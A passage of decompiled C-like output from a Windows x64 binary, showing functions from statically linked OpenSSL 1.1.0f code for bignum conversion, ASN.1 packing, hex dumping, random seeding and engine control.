      v13 = *((_QWORD *)a2 + 3);
      v14 = *((_QWORD *)a3 + 3);
      *((_QWORD *)a1 + 3) = v13 - (int)result - v14;
      if ( v13 != v14 )
        LODWORD(result) = v13 < v14;
      a2 += 32;
      a3 += 32;
      a1 += 32;
    }
    if ( a4 )
    {
      v15 = a3 - a2;
      v16 = a1 - a2;
      do
      {
        v17 = *(_QWORD *)a2;
        v18 = *(_QWORD *)&a2[v15];
        *(_QWORD *)&a2[v16] = *(_QWORD *)a2 - (int)result - v18;
        if ( v17 != v18 )
          LODWORD(result) = v17 < v18;
        a2 += 8;
        --a4;
      }
      while ( a4 );
    }
    return (int)result;
  }
  return result;
}

//----- (00000001400751A0) ----------------------------------------------------
_BYTE *__fastcall sub_1400751A0(__int64 a1, int a2, unsigned __int64 *a3)
{
  int v3; // eax
  __int64 v5; // rbp
  unsigned __int64 v7; // rbx
  void *v8; // r14
  _BYTE *result; // rax
  int v10; // edi
  int v11; // r15d
  unsigned __int64 v12; // r13
  int v13; // r8d
  int v14; // ebx
  unsigned __int64 v15; // rsi
  int v16; // eax
  int v17; // [rsp+20h] [rbp-58h]
  char v19; // [rsp+98h] [rbp+20h]

  v5 = a2;
  v7 = (unsigned int)(v3 - 63);
  v8 = 0i64;
  if ( sub_140027160(a1) )
  {
    result = sub_14001D8E0((unsigned int)v7);
    v8 = result;
    if ( result )
    {
      *result = 0;
      *a3 = v7;
      return result;
    }
    sub_140024610(3, 142, v7 + 64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_intern.c", 33);
    goto LABEL_36;
  }
  if ( (unsigned int)(v5 - 1) > 6 )
  {
    v17 = 43;
    goto LABEL_35;
  }
  v10 = (_DWORD)v7 << v5;
  v11 = 2 * ((_DWORD)v7 << v5);
  if ( sub_1400270E0(a1) )
    LOBYTE(v7) = -1;
  v19 = v7;
  if ( !*(_QWORD *)a1 || !*(_DWORD *)(a1 + 8) )
  {
    v17 = 55;
LABEL_35:
    sub_140024610(3, 142, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_intern.c", v17);
    goto LABEL_36;
  }
  v12 = (int)sub_140027260(a1);
  v8 = sub_14001D8E0(v12 + 1);
  if ( !v8 )
  {
    sub_140024610(3, 142, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_intern.c", 66);
LABEL_36:
    sub_14001D930(v8);
    return 0i64;
  }
  v13 = v11 - 1;
  v14 = (v11 - 1) & **(_DWORD **)a1;
  v15 = 0i64;
  while ( v14 || v15 + v5 + 1 < v12 )
  {
    LOBYTE(v16) = 0;
    if ( (v14 & 1) != 0 )
    {
      v16 = v14;
      if ( (v14 & v10) != 0 )
      {
        v16 = v14 - v11;
        if ( v15 + v5 + 1 >= v12 )
          v16 = v14 & (v13 >> 1);
      }
      if ( v16 <= -v10 || v16 >= v10 || (v16 & 1) == 0 )
      {
        v17 = 101;
        goto LABEL_35;
      }
      v14 -= v16;
      if ( v14 && v14 != v11 && v14 != v10 )
      {
        v17 = 113;
        goto LABEL_35;
      }
    }
    *((_BYTE *)v8 + v15) = v16 * v19;
    v14 = v10 * sub_1400270A0(a1, (int)++v15 + (int)v5) + (v14 >> 1);
    if ( v14 > v11 )
    {
      v17 = 124;
      goto LABEL_35;
    }
    v13 = v11 - 1;
  }
  if ( v15 > v12 + 1 )
  {
    v17 = 130;
    goto LABEL_35;
  }
  *a3 = v15;
  return v8;
}
// 1400751CB: variable 'v3' is possibly undefined

//----- (00000001400753D0) ----------------------------------------------------
__int64 __fastcall sub_1400753D0(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // r8

  result = *(int *)(a1 + 8);
  if ( (int)result < *(_DWORD *)(a1 + 12) )
  {
    v2 = 8 * result;
    do
    {
      v2 += 8i64;
      result = (unsigned int)(result + 1);
      *(_QWORD *)(v2 + *(_QWORD *)a1 - 8) = 0i64;
    }
    while ( (int)result < *(_DWORD *)(a1 + 12) );
  }
  return result;
}

//----- (0000000140075410) ----------------------------------------------------
FILE *__fastcall sub_140075410(const CHAR *a1, const char *a2)
{
  unsigned int v3; // ebx
  const CHAR *i; // rax
  int v6; // ebx
  DWORD v7; // r14d
  int cchWideChar; // edx
  FILE *result; // rax
  unsigned __int64 v10; // rax
  __int64 v11; // rcx
  signed __int64 v12; // rcx
  void *v13; // rsp
  void *v14; // rsp
  unsigned int v15; // r9d
  const char *j; // rax
  WCHAR WideCharStr[8]; // [rsp+30h] [rbp+0h] BYREF

  v3 = 0;
  for ( i = a1; *i; ++v3 )
  {
    if ( v3 >= 0x80000000 )
      break;
    ++i;
  }
  v6 = (v3 & 0x7FFFFFFF) + 1;
  v7 = 8;
  cchWideChar = MultiByteToWideChar(0xFDE9u, 8u, a1, v6, 0i64, 0);
  if ( cchWideChar <= 0 )
  {
    if ( GetLastError() != 1004
      || (v7 = 0, cchWideChar = MultiByteToWideChar(0xFDE9u, 0, a1, v6, 0i64, 0), cchWideChar <= 0) )
    {
      if ( GetLastError() == 1113 )
        return fopen(a1, a2);
      return 0i64;
    }
  }
  v10 = 2i64 * cchWideChar;
  v11 = v10 + 15;
  if ( v10 + 15 <= v10 )
    v11 = 0xFFFFFFFFFFFFFF0i64;
  v12 = v11 & 0xFFFFFFFFFFFFFFF0ui64;
  v13 = alloca(v12);
  v14 = alloca(v12);
  if ( !MultiByteToWideChar(0xFDE9u, v7, a1, v6, WideCharStr, cchWideChar) )
    return 0i64;
  v15 = 0;
  for ( j = a2; *j; ++v15 )
  {
    if ( v15 >= 0x80000000 )
      break;
    ++j;
  }
  if ( !MultiByteToWideChar(0xFDE9u, 0, a2, (v15 & 0x7FFFFFFF) + 1, WideCharStr, 8) )
    return 0i64;
  result = wfopen(WideCharStr, WideCharStr);
  if ( !result )
  {
    if ( *errno() == 2 || *errno() == 9 )
      return fopen(a1, a2);
    return 0i64;
  }
  return result;
}

//----- (00000001400755F0) ----------------------------------------------------
_DWORD *__fastcall sub_1400755F0(unsigned int *a1, __int64 a2, _DWORD **a3)
{
  _DWORD *v6; // rdi
  int v8; // eax

  if ( !a3 || (v6 = *a3) == 0i64 )
  {
    v6 = sub_140047570();
    if ( !v6 )
    {
      sub_140024610(13, 198, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_pack.c", 22);
      return 0i64;
    }
  }
  sub_14001D930(*((void **)v6 + 1));
  *((_QWORD *)v6 + 1) = 0i64;
  v8 = sub_1400536F0(a1, (unsigned __int8 **)v6 + 1, a2);
  *v6 = v8;
  if ( !v8 )
  {
    sub_140024610(13, 198, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_pack.c", 33);
    goto LABEL_9;
  }
  if ( !*((_QWORD *)v6 + 1) )
  {
    sub_140024610(13, 198, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_pack.c", 37);
LABEL_9:
    if ( !a3 || !*a3 )
      sub_140047500((__int64)v6);
    return 0i64;
  }
  if ( a3 && !*a3 )
    *a3 = v6;
  return v6;
}

//----- (0000000140075710) ----------------------------------------------------
__int64 __fastcall sub_140075710(unsigned int *a1, __int64 a2)
{
  __int64 v2; // r8
  __int64 result; // rax
  char *v4; // [rsp+40h] [rbp+8h] BYREF

  v2 = *a1;
  v4 = (char *)*((_QWORD *)a1 + 1);
  result = sub_1400516D0(0i64, &v4, v2, a2);
  if ( !result )
  {
    sub_140024610(13, 199, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_pack.c", 60);
    return 0i64;
  }
  return result;
}

//----- (0000000140075770) ----------------------------------------------------
__int64 __fastcall sub_140075770(__int64 a1, __int64 a2, unsigned int a3)
{
  return sub_1400757D0((__int64 (__fastcall *)(char *, __int64, __int64))sub_140075C40, a1, a2, a3, 0);
}

//----- (00000001400757A0) ----------------------------------------------------
__int64 __fastcall sub_1400757A0(__int64 a1, __int64 a2, unsigned int a3, int a4)
{
  return sub_1400757D0((__int64 (__fastcall *)(char *, __int64, __int64))sub_140075C40, a1, a2, a3, a4);
}

//----- (00000001400757D0) ----------------------------------------------------
__int64 __fastcall sub_1400757D0(
        __int64 (__fastcall *a1)(char *, __int64, __int64),
        __int64 a2,
        __int64 a3,
        __int64 a4,
        int a5)
{
  unsigned int v5; // r14d
  int v6; // esi
  __int64 v7; // r12
  __int64 (__fastcall *v8)(char *, __int64, __int64); // r13
  int v9; // edi
  int v10; // ebx
  int v11; // eax
  int v12; // edx
  unsigned int v13; // r13d
  int v14; // ebx
  __int64 v15; // rdi
  char *v16; // rdx
  int v17; // eax
  __int64 v18; // rbx
  int v19; // edi
  unsigned __int8 v20; // cl
  __int64 v21; // r9
  char *v22; // rcx
  unsigned int i; // eax
  __int64 v24; // rdx
  unsigned int v25; // ebx
  bool v26; // zf
  char *j; // rax
  __int64 v28; // rdx
  __int64 v30; // [rsp+20h] [rbp-E0h]
  unsigned int v31; // [rsp+30h] [rbp-D0h]
  int v32; // [rsp+34h] [rbp-CCh]
  int v33; // [rsp+38h] [rbp-C8h]
  __int64 v34; // [rsp+40h] [rbp-C0h]
  __int64 (__fastcall *v35)(char *, __int64, __int64); // [rsp+48h] [rbp-B8h]
  __int64 v36; // [rsp+50h] [rbp-B0h]
  char v37[24]; // [rsp+58h] [rbp-A8h] BYREF
  char v38[304]; // [rsp+70h] [rbp-90h] BYREF
  char v39[144]; // [rsp+1A0h] [rbp+A0h] BYREF

  v5 = 0;
  v6 = a4;
  v36 = a2;
  v7 = a3;
  v35 = a1;
  v8 = a1;
  v31 = 0;
  v9 = 0;
  v32 = 0;
  if ( (int)a4 > 0 )
  {
    a1 = (__int64 (__fastcall *)(char *, __int64, __int64))((int)a4 + a3 - 1);
    a2 = 1 - a3;
    do
    {
      if ( (*(_BYTE *)a1 & 0xDF) != 0 )
        break;
      a1 = (__int64 (__fastcall *)(char *, __int64, __int64))((char *)a1 - 1);
      ++v9;
      --v6;
    }
    while ( (__int64)a1 + a2 > 0 );
    v32 = v9;
  }
  v10 = 0;
  if ( a5 >= 0 )
    v10 = a5;
  if ( v10 )
  {
    if ( v10 > 128 )
      v10 = 128;
    memset(v39, 32, v10);
  }
  if ( (unsigned __int64)v10 >= 0x81 )
    _report_rangecheckfailure(a1, a2, a3, a4);
  v39[v10] = 0;
  v11 = v10;
  if ( v10 > 6 )
    v11 = 6;
  v33 = 16 - (v10 - v11 + 3) / 4;
  v12 = v6 / v33 + 1;
  if ( v33 * (v6 / v33) >= v6 )
    v12 = v6 / v33;
  if ( v12 <= 0 )
  {
    v25 = 0;
  }
  else
  {
    v13 = 0;
    v34 = (unsigned int)v12;
    do
    {
      sub_14003C060(v38, v39, 0x121ui64);
      sub_14002A5C0(v37, 0x14ui64, "%04x - ", v13);
      sub_14003BFE0(v38, v37, 0x121ui64);
      v14 = 0;
      v15 = 0i64;
      if ( v33 > 0i64 )
      {
        do
        {
          if ( (int)(v14 + v13) < v6 )
          {
            v17 = 32;
            if ( v14 == 7 )
              v17 = 45;
            LODWORD(v30) = v17;
            sub_14002A5C0(v37, 0x14ui64, "%02x%c", *(unsigned __int8 *)(v7 + v15), v30);
            v16 = v37;
          }
          else
          {
            v16 = "   ";
          }
          sub_14003BFE0(v38, v16, 0x121ui64);
          ++v14;
          ++v15;
        }
        while ( v15 < v33 );
        v5 = 0;
      }
      sub_14003BFE0(v38, "  ", 0x121ui64);
      v18 = 0i64;
      if ( v33 > 0i64 )
      {
        v19 = v13;
        do
        {
          if ( v19 >= v6 )
            break;
          v20 = *(_BYTE *)(v7 + v18);
          v21 = v20;
          if ( (unsigned __int8)(v20 - 32) > 0x5Eu )
            v21 = 46i64;
          sub_14002A5C0(v37, 0x14ui64, "%c", v21);
          sub_14003BFE0(v38, v37, 0x121ui64);
          ++v19;
          ++v18;
        }
        while ( v18 < v33 );
      }
      sub_14003BFE0(v38, "\n", 0x121ui64);
      v22 = v38;
      for ( i = 0; *v22; ++i )
      {
        if ( i >= 0x80000000 )
          break;
        ++v22;
      }
      v24 = i;
      LODWORD(v24) = i & 0x7FFFFFFF;
      v7 += v33;
      v13 += v33;
      v25 = v35(v38, v24, v36) + v31;
      v26 = v34-- == 1;
      v31 = v25;
    }
    while ( !v26 );
    v9 = v32;
    v8 = v35;
  }
  if ( v9 > 0 )
  {
    LODWORD(v30) = v6 + v9;
    sub_14002A5C0(v38, 0x121ui64, "%s%04x - <SPACES/NULS>\n", v39, v30);
    for ( j = v38; *j; ++v5 )
    {
      if ( v5 >= 0x80000000 )
        break;
      ++j;
    }
    v28 = v5;
    LODWORD(v28) = v5 & 0x7FFFFFFF;
    v25 += v8(v38, v28, v36);
  }
  return v25;
}
// 14007597D: variable 'v30' is possibly undefined
// 140075B1D: variable 'a1' is possibly undefined
// 140075B1D: variable 'a2' is possibly undefined
// 140075B1D: variable 'a3' is possibly undefined
// 140075B1D: variable 'a4' is possibly undefined
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 1400757D0: using guessed type char var_E0[144];

//----- (0000000140075B30) ----------------------------------------------------
__int64 __fastcall sub_140075B30(__int64 a1, unsigned int a2, int a3, __int64 a4, int a5)
{
  int v5; // esi
  __int64 v10; // rbx
  __int64 v11; // rbp

  v5 = 0;
  if ( a5 >= 1 )
  {
    v10 = 0i64;
    v11 = a5 - 1;
    if ( a5 - 1 > 0 )
    {
      do
      {
        if ( v10 && !v5 )
          sub_14002A590(a1, "%*s", a2, byte_1400D7DAE);
        sub_14002A590(a1, "%02X:", *(unsigned __int8 *)(v10 + a4));
        v5 = (v5 + 1) % a3;
        if ( !v5 )
          sub_14002A590(a1, "\n");
        ++v10;
      }
      while ( v10 < v11 );
      if ( a5 != 1 && !v5 )
        sub_14002A590(a1, "%*s", a2, byte_1400D7DAE);
    }
    sub_14002A590(a1, "%02X", *(unsigned __int8 *)(a4 + v11));
  }
  return 1i64;
}

//----- (0000000140075C40) ----------------------------------------------------
__int64 __fastcall sub_140075C40(__int64 a1, unsigned int a2, __int64 a3)
{
  return sub_14002A430(a3, a1, a2);
}

//----- (0000000140075C70) ----------------------------------------------------
__int64 __fastcall sub_140075C70(_DWORD *a1, __int64 a2)
{
  *a1 = *(_DWORD *)(a2 + 32);
  return 1i64;
}

//----- (0000000140075C80) ----------------------------------------------------
__int64 __fastcall sub_140075C80(_DWORD *a1, __int64 a2)
{
  __int64 result; // rax

  result = *(unsigned int *)(a2 + 32);
  *a1 = result;
  return result;
}

//----- (0000000140075C90) ----------------------------------------------------
__int64 __fastcall sub_140075C90(int *a1, char *a2, __int64 a3, __int64 a4)
{
  int v4; // eax
  int v7; // r8d
  char v8; // r9
  unsigned int v9; // edx
  int v10; // r11d
  int v11; // ebx
  int v12; // edi
  int v13; // esi
  __int64 v14; // rbp
  unsigned int v15; // edx
  int v16; // ecx
  int v17; // r11d
  int v18; // ecx
  int v19; // r11d
  __int64 i; // rdx
  char v21; // cl

  v4 = *a1;
  if ( *a1 == *(_DWORD *)(a4 + 32) )
    return 0xFFFFFFFFi64;
  v7 = 0;
  if ( v4 >= 0 )
  {
    v8 = 0;
  }
  else
  {
    v8 = -1;
    v4 = ~v4;
  }
  v9 = v4;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 8i64;
  do
  {
    v10 += v9 != 0;
    v15 = v9 >> 1;
    v13 += v15 != 0;
    v15 >>= 1;
    v12 += v15 != 0;
    v15 >>= 1;
    v16 = v15 != 0;
    v9 = v15 >> 1;
    v11 += v16;
    --v14;
  }
  while ( v14 );
  v17 = v12 + v11 + v13 + v10;
  v18 = v17 & 7;
  LOBYTE(v7) = v18 == 0;
  v19 = (v17 + 7) >> 3;
  if ( a2 )
  {
    if ( !v18 )
      *a2++ = v8;
    for ( i = v19 - 1; i >= 0; --i )
    {
      v21 = v4;
      v4 = (unsigned int)v4 >> 8;
      a2[i] = v8 ^ v21;
    }
  }
  return (unsigned int)(v7 + v19);
}

//----- (0000000140075D90) ----------------------------------------------------
__int64 __fastcall sub_140075D90(int *a1, char *a2, int a3, __int64 a4, int a5, __int64 a6)
{
  int v6; // r9d
  int v8; // r10d
  __int64 i; // rcx
  int v11; // eax

  v6 = 0;
  v8 = 256;
  if ( a3 > 1 )
  {
    if ( *a2 )
    {
      if ( *a2 != -1 )
        goto LABEL_7;
      v8 = 255;
    }
    else
    {
      v8 = 0;
    }
    ++a2;
    --a3;
  }
LABEL_7:
  if ( a3 > 4 )
  {
    sub_140024610(13, 166, 128, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\x_long.c", 158);
    return 0i64;
  }
  if ( v8 == 256 )
  {
    if ( a3 && *a2 < 0 )
      v8 = 255;
    else
      v8 = 0;
  }
  else if ( ((v8 ^ *a2) & 0x80u) == 0 )
  {
    sub_140024610(13, 166, 221, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\x_long.c", 169);
    return 0i64;
  }
  for ( i = 0i64; i < a3; v6 = v8 ^ v11 | (v6 << 8) )
    v11 = (unsigned __int8)a2[i++];
  if ( v6 < 0 )
  {
    sub_140024610(13, 166, 128, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\x_long.c", 179);
    return 0i64;
  }
  if ( v8 )
    v6 = ~v6;
  if ( v6 == *(_DWORD *)(a6 + 32) )
  {
    sub_140024610(13, 166, 128, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\x_long.c", 185);
    return 0i64;
  }
  *a1 = v6;
  return 1i64;
}

//----- (0000000140075EB0) ----------------------------------------------------
__int64 __fastcall sub_140075EB0(__int64 a1, unsigned int *a2)
{
  return sub_14002A590(a1, "%ld\n", *a2);
}

//----- (0000000140075ED0) ----------------------------------------------------
void *sub_140075ED0()
{
  return &unk_14010E768;
}

//----- (0000000140075EE0) ----------------------------------------------------
void *sub_140075EE0()
{
  return &unk_14010E798;
}

//----- (0000000140075EF0) ----------------------------------------------------
__int64 sub_140075EF0()
{
  HCRYPTPROV phProv; // [rsp+30h] [rbp-A8h] BYREF
  DWORD TickCount; // [rsp+38h] [rbp-A0h] BYREF
  DWORD CurrentProcessId; // [rsp+3Ch] [rbp-9Ch] BYREF
  LARGE_INTEGER PerformanceCount; // [rsp+40h] [rbp-98h] BYREF
  struct _MEMORYSTATUS Buffer; // [rsp+48h] [rbp-90h] BYREF
  BYTE pbBuffer[64]; // [rsp+80h] [rbp-58h] BYREF

  if ( CryptAcquireContextW(&phProv, 0i64, 0i64, 1u, 0xF0000040) )
  {
    if ( CryptGenRandom(phProv, 0x40u, pbBuffer) )
      sub_140025410((__int64)pbBuffer, 0x40u);
    CryptReleaseContext(phProv, 0);
  }
  if ( CryptAcquireContextW(&phProv, 0i64, L"Intel Hardware Cryptographic Service Provider", 0x16u, 0xF0000040) )
  {
    if ( CryptGenRandom(phProv, 0x40u, pbBuffer) )
      sub_140025410((__int64)pbBuffer, 0x40u);
    CryptReleaseContext(phProv, 0);
  }
  if ( !dword_14013CFF0 )
    goto LABEL_13;
  if ( !QueryPerformanceCounter(&PerformanceCount) )
  {
    dword_14013CFF0 = 0;
LABEL_13:
    TickCount = GetTickCount();
    sub_140025410((__int64)&TickCount, 4u);
    goto LABEL_14;
  }
  sub_140025410((__int64)&PerformanceCount, 8u);
  if ( !dword_14013CFF0 )
    goto LABEL_13;
LABEL_14:
  GlobalMemoryStatus(&Buffer);
  sub_140025410((__int64)&Buffer, 0x38u);
  CurrentProcessId = GetCurrentProcessId();
  sub_140025410((__int64)&CurrentProcessId, 4u);
  return 1i64;
}
// 14013CFF0: using guessed type int dword_14013CFF0;

//----- (00000001400760B0) ----------------------------------------------------
__int64 __fastcall sub_1400760B0(__int64 a1, unsigned int a2)
{
  int v2; // eax
  unsigned int v3; // ebx
  int v4; // eax

  v3 = 0;
  v4 = sub_140076110(a1, v2 - 30, a2, 0i64, 0i64);
  if ( v4 >= 0 )
  {
    LOBYTE(v3) = (v4 & 7) != 0;
    return v3;
  }
  else
  {
    sub_140024610(38, 170, 138, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 191);
    return 0i64;
  }
}
// 1400760C4: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140076110) ----------------------------------------------------
int __fastcall sub_140076110(__int64 a1, unsigned int a2, unsigned int a3, _BYTE *a4, __int64 a5)
{
  int v5; // eax
  int result; // eax
  int v11; // ebx
  __int64 (__fastcall *v12)(__int64, _QWORD, _QWORD, _BYTE *, __int64); // r10

  if ( !a1 )
  {
    sub_140024610(v5 - 10, v5 + 94, v5 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 137);
    return 0;
  }
  sub_140025D20((_DWORD *)qword_140147E80);
  v11 = *(_DWORD *)(a1 + 156);
  sub_140025CE0((_DWORD *)qword_140147E80);
  v12 = *(__int64 (__fastcall **)(__int64, _QWORD, _QWORD, _BYTE *, __int64))(a1 + 112);
  result = v12 != 0i64;
  if ( v11 <= 0 )
  {
    sub_140024610(38, 142, 130, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 145);
    return 0;
  }
  if ( a2 != 10 )
  {
    if ( a2 - 11 <= 7 )
    {
      if ( !v12 )
      {
        sub_140024610(38, 142, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 166);
        return -1;
      }
      if ( (*(_BYTE *)(a1 + 152) & 2) == 0 )
        return sub_140076490(a1, a2, a3, a4);
    }
    if ( v12 )
    {
      return v12(a1, a2, a3, a4, a5);
    }
    else
    {
      sub_140024610(38, 142, 120, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 179);
      return 0;
    }
  }
  return result;
}
// 140076150: variable 'v5' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140076280) ----------------------------------------------------
__int64 __fastcall sub_140076280(__int64 a1, _BYTE *a2, const char *a3, int a4)
{
  int v4; // eax
  unsigned int v8; // edi
  int v9; // eax
  unsigned int v10; // ebp
  int v11; // eax
  int v12; // r8d
  char *v14; // r9
  unsigned int v15; // r8d
  int v16; // eax
  int v17; // [rsp+20h] [rbp-28h]
  char *EndPtr; // [rsp+50h] [rbp+8h] BYREF

  if ( a1 && a2 )
  {
    if ( *(_QWORD *)(a1 + 112) && (v8 = 0, v9 = sub_140076110(a1, v4 - 35, 0, a2, 0i64), v10 = v9, v9 > 0) )
    {
      if ( !(unsigned int)sub_1400760B0(a1, v9) )
      {
        sub_140024610(38, 171, 134, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 268);
        return 0i64;
      }
      v11 = sub_140076110(a1, 0x12u, v10, 0i64, 0i64);
      if ( v11 < 0 )
      {
        v17 = 279;
LABEL_21:
        v12 = 110;
        goto LABEL_12;
      }
      if ( (v11 & 4) != 0 )
      {
        if ( a3 )
        {
          v17 = 288;
          v12 = 136;
LABEL_12:
          sub_140024610(38, 171, v12, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", v17);
          return 0i64;
        }
        v14 = 0i64;
        v15 = 0;
      }
      else
      {
        if ( !a3 )
        {
          sub_140024610(38, 171, 135, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 304);
          return 0i64;
        }
        if ( (v11 & 2) != 0 )
        {
          v14 = (char *)a3;
          v15 = 0;
        }
        else
        {
          if ( (v11 & 1) == 0 )
          {
            v17 = 322;
            goto LABEL_21;
          }
          v16 = strtol(a3, &EndPtr, 10);
          if ( a3 == EndPtr || *EndPtr )
          {
            sub_140024610(38, 171, 133, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 328);
            return 0i64;
          }
          v14 = 0i64;
          v15 = v16;
        }
      }
      LOBYTE(v8) = sub_140076110(a1, v10, v15, v14, 0i64) > 0;
      return v8;
    }
    else
    {
      if ( !a4 )
      {
        sub_140024610(38, 171, 137, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 263);
        return 0i64;
      }
      sub_140023B90();
      return 1i64;
    }
  }
  else
  {
    sub_140024610(38, 171, 67, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 245);
    return 0i64;
  }
}
// 1400762C7: variable 'v4' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140076490) ----------------------------------------------------
int __fastcall sub_140076490(__int64 a1, int a2, unsigned int a3, _BYTE *a4)
{
  _QWORD *v7; // rax
  __int64 v9; // r11
  __int64 v10; // r10
  int v11; // eax
  unsigned __int8 *v12; // rcx
  __int64 v13; // r9
  int v14; // edx
  int v15; // r8d
  __int64 v16; // r9
  unsigned int v17; // eax
  unsigned int *v18; // rcx
  int i; // r8d
  unsigned int v20; // edx
  bool v21; // zf
  __int64 v22; // rcx
  _BYTE *j; // rdx
  const char *v24; // r9
  const char *k; // rcx
  _BYTE *v26; // rdx
  _BYTE *v27; // rcx
  const char *m; // rcx
  _BYTE *n; // rcx

  if ( a2 == 11 )
  {
    v7 = *(_QWORD **)(a1 + 144);
    if ( v7 && *(_DWORD *)v7 && v7[1] )
      return *(_DWORD *)v7;
    else
      return 0;
  }
  if ( ((a2 - 13) & 0xFFFFFFF9) == 0 && a2 != 19 && !a4 )
  {
    sub_140024610(38, 172, 67, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 77);
    return -1;
  }
  if ( a2 == 13 )
  {
    v9 = *(_QWORD *)(a1 + 144);
    if ( v9 )
    {
      v10 = *(_QWORD *)(a1 + 144);
      v11 = 0;
      while ( *(_DWORD *)v10 )
      {
        v12 = *(unsigned __int8 **)(v10 + 8);
        if ( !v12 )
          goto LABEL_23;
        v13 = a4 - v12;
        do
        {
          v14 = v12[v13];
          v15 = *v12 - v14;
          if ( v15 )
            break;
          ++v12;
        }
        while ( v14 );
        if ( !v15 )
        {
LABEL_23:
          if ( *(_DWORD *)v10 && *(_QWORD *)(v10 + 8) && v11 >= 0 )
            return *(_DWORD *)(32i64 * v11 + v9);
          break;
        }
        ++v11;
        v10 += 32i64;
      }
    }
    sub_140024610(38, 172, 137, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 85);
    return -1;
  }
  v16 = *(_QWORD *)(a1 + 144);
  if ( !v16 )
    goto LABEL_67;
  v17 = 0;
  v18 = *(unsigned int **)(a1 + 144);
  for ( i = 0; ; ++i )
  {
    v20 = *v18;
    if ( !*v18 || !*((_QWORD *)v18 + 1) )
      break;
    v21 = v20 == a3;
    if ( v20 >= a3 )
      goto LABEL_33;
    v18 += 8;
  }
  v21 = v20 == a3;
LABEL_33:
  if ( !v21 || i < 0 )
  {
LABEL_67:
    sub_140024610(38, 172, 138, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 97);
    return -1;
  }
  switch ( a2 )
  {
    case 12:
      v22 = 32i64 * (i + 1);
      if ( !*(_DWORD *)(v22 + v16) || !*(_QWORD *)(v22 + v16 + 8) )
        return 0;
      return *(_DWORD *)(v22 + v16);
    case 14:
      for ( j = *(_BYTE **)(32i64 * i + v16 + 8); *j; ++v17 )
      {
        if ( v17 >= 0x80000000 )
          break;
        ++j;
      }
      return v17 & 0x7FFFFFFF;
    case 15:
      v24 = *(const char **)(32i64 * i + v16 + 8);
      for ( k = v24; *k; ++v17 )
      {
        if ( v17 >= 0x80000000 )
          break;
        ++k;
      }
      return sub_14002A5C0(a4, (v17 & 0x7FFFFFFF) + 1, "%s", v24);
    case 16:
      v26 = *(_BYTE **)(32i64 * i + v16 + 16);
      if ( v26 )
      {
        if ( *v26 )
        {
          do
          {
            if ( v17 >= 0x80000000 )
              return v17 & 0x7FFFFFFF;
            ++v26;
            ++v17;
          }
          while ( *v26 );
          return v17 & 0x7FFFFFFF;
        }
        return v17 & 0x7FFFFFFF;
      }
      v27 = off_14013CFF8;
      if ( !*(_BYTE *)off_14013CFF8 )
        return v17 & 0x7FFFFFFF;
      do
      {
        if ( v17 >= 0x80000000 )
          return v17 & 0x7FFFFFFF;
        ++v27;
        ++v17;
      }
      while ( *v27 );
      return v17 & 0x7FFFFFFF;
    case 17:
      v24 = *(const char **)(32i64 * i + v16 + 16);
      if ( v24 )
      {
        for ( m = v24; *m; ++v17 )
        {
          if ( v17 >= 0x80000000 )
            break;
          ++m;
        }
      }
      else
      {
        v24 = (const char *)off_14013CFF8;
        for ( n = off_14013CFF8; *n; ++v17 )
        {
          if ( v17 >= 0x80000000 )
            break;
          ++n;
        }
      }
      return sub_14002A5C0(a4, (v17 & 0x7FFFFFFF) + 1, "%s", v24);
    case 18:
      return *(_DWORD *)(32i64 * i + v16 + 24);
    default:
      sub_140024610(38, 172, 110, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_ctrl.c", 129);
      return -1;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 14013CFF8: using guessed type void *off_14013CFF8;

//----- (00000001400767D0) ----------------------------------------------------
void **sub_1400767D0()
{
  return &off_14010E9A8;
}
// 14010E9A8: using guessed type void *off_14010E9A8;

//----- (00000001400767E0) ----------------------------------------------------
void **sub_1400767E0()
{
